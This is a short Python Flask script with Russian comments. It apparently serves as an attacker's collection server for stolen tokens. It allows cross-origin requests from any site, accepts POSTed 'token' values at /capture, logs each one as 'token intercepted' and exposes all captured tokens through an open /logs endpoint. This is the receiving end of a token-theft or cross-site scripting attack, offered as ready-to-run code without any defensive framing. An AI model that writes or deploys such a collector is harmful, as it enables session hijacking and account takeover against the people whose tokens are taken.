from flask import Flask, request, jsonify
from flask_cors import CORS  # ← обязательно импортируйте

app = Flask(__name__)
CORS(app)  # ← разрешаем запросы с любых доменов

tokens = []

@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        # Для preflight-запросов возвращаем 200 с нужными заголовками
        response = app.make_default_options_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    data = request.get_json()
    if data and 'token' in data:
        tokens.append(data)
        print(f"[+] Токен перехвачен: {data['token']}")
        return '', 200
    return '', 400

@app.route('/logs', methods=['GET'])
def logs():
    return jsonify(tokens)

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)